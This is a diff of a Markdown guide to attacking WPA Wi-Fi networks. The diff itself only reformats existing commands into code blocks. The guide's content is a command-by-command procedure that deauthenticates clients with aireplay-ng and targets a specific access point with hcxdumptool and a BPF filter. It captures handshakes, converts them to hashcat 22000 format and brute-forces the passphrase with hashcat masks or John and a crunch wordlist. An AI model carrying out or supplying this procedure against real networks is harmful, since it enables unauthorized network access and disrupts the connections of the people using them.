@@ -109,36 +109,36 @@ sudo aireplay-ng -0 0 -a $AP_mac -c $victim_mac $interface
 
 The command to get general information about the target (ESSID, CHANNEL, MAC_AP. IN/OFF RANGE) is:
 
-hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=1 -F
+`hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=1 -F`
 
 
 The command to get general information about the target (ESSID, CHANNEL, MAC_AP. IN/OFF RANGE) and to check that it is within range:
 
-hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=5 -F
+`hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=5 -F`
 
 
 The full command to create a BPF to the target (attack ccce1edc3bee) would be as follows:
 
-hcxdumptool --bpfc="wlan addr1 ccce1edc3bee or wlan addr2 ccce1edc3bee or wlan addr3 ccce1edc3bee or type mgt subtype probereq" > attack.bpf
+`hcxdumptool --bpfc="wlan addr1 ccce1edc3bee or wlan addr2 ccce1edc3bee or wlan addr3 ccce1edc3bee or type mgt subtype probereq" > attack.bpf`
 
 
 Since we have now made the BPF, we can start the attack using all the information mentioned above depending on the invasive levewl:
 
-sudo hcxdumptool -i wlan0 -c 11a --bpf=attack.bpf -w testap.pcapng
+`sudo hcxdumptool -i wlan0 -c 11a --bpf=attack.bpf -w testap.pcapng`
 
 or (do not respond to CLIENTs)
-sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --bpf=attack.bpf -w testap.pcapng
+`sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --bpf=attack.bpf -w testap.pcapng`
 
 or (do not DISASSOCIATE CLIENTs)
-sudo hcxdumptool -i wlan0 --rds=3 -c 11a --disable_disassociation --bpf=attack.bpf -w testap.pcapng
+`sudo hcxdumptool -i wlan0 --rds=3 -c 11a --disable_disassociation --bpf=attack.bpf -w testap.pcapng`
 
 or (do not respond to CLIENTs and do not DISASSOCIATE CLIENTs)
-sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --disable_disassociation --bpf=attack.bpf -w testap.pcapng
+`sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --disable_disassociation --bpf=attack.bpf -w testap.pcapng`
 
 
 Convert the traffic to hash format 22000
 
-hcxpcapngtool -o testap.hc22000 testap.pcapng
+`hcxpcapngtool -o testap.hc22000 testap.pcapng`
 
 Run Hashcat on the list of words obtained from WPA traffic
 
@@ -151,10 +151,11 @@ hashcat -m 22000 filtered_hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
 
 OR use John
 
+```bash
 hcxpcapngtool --john testap.john testap.pcapng
 crunch 8 12 -t @@@@@@@@ > mylist.txt
 john -w mylist.txt --format=wpapsk-opencl testap.john
-
+```
 
 ## Attack 2
 
